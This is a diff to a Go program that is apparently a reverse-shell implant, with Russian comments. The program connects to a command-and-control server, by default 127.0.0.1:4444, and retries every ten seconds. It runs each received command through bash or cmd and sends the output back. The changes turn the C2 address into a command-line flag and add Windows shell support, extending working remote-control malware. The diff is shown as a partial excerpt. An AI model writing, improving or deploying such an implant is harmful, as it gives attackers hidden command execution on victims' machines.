@@ -2,22 +2,24 @@ package main
 
 import (
 	"bufio"
+	"flag"
 	"fmt"
 	"net"
 	"os"
 	"os/exec"
+	"runtime"
 	"strings"
 	"time"
 )
 
-const (
-	serverIP   = "127.0.0.1" // или ваш IP
-	serverPort = "4444"
+var (
+	serverAddr = flag.String("server", "127.0.0.1:4444", "адрес C2 сервера (IP:PORT)")
 )
 
 func main() {
+	flag.Parse()
 	for {
-		conn, err := net.Dial("tcp", serverIP+":"+serverPort)
+		conn, err := net.Dial("tcp", *serverAddr)
 		if err != nil {
 			fmt.Println("[!] Не удалось подключиться к C2, повтор через 10 сек:", err)
 			time.Sleep(10 * time.Second)
@@ -54,12 +56,19 @@ func handleConnection(conn net.Conn) {
 		}
 		fmt.Printf("[*] Получена команда: %s\n", cmdLine)
 
-		cmd := exec.Command("bash", "-c", cmdLine)
+		// Выбор шелла в зависимости от ОС
+		var cmd *exec.Cmd
+		if runtime.GOOS == "windows" {
+			cmd = exec.Command("cmd", "/c", cmdLine)
+		} else {
+			cmd = exec.Command("bash", "-c", cmdLine)
+		}
 		output, err := cmd.CombinedOutput()
 		if err != nil {
 			output = append(output, []byte("\nError: "+err.Error())...)
 		}
 
+		// Отправка длины + данных
 		length := uint32(len(output))
 		lenBytes := []byte{
 			byte(length >> 24),
